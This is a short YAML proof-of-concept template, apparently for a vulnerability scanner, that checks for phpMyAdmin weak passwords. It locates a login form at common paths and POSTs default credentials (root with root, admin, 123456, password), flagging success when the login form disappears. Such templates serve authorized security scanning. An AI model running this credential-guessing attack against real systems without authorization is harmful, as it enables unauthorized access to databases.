id: poc-yaml-phpmyadmin-weak-pass
info:
  name: PhpMyAdmin 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: PhpMyAdmin
  osprey-id: vb_2019_0022
variables:
  r_username: root
  r_password: 'root

    admin

    123456

    password'
  r_paths: 'phpmyadmin/index.php

    index.php

    phpMyAdmin/index.php'
requests:
- method: GET
  path: /{{.r_paths}}
  expression: contains(body, "name=\"login_form\"")
- method: POST
  path: /{{.r_paths}}
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: pma_username={{.r_username}}&pma_password={{.r_password}}
  expression: 'status_code != 404 &&

    !contains(body, "name=\"login_form\"") &&

    contains(body, "phpMyAdmin")

    '
transport: http
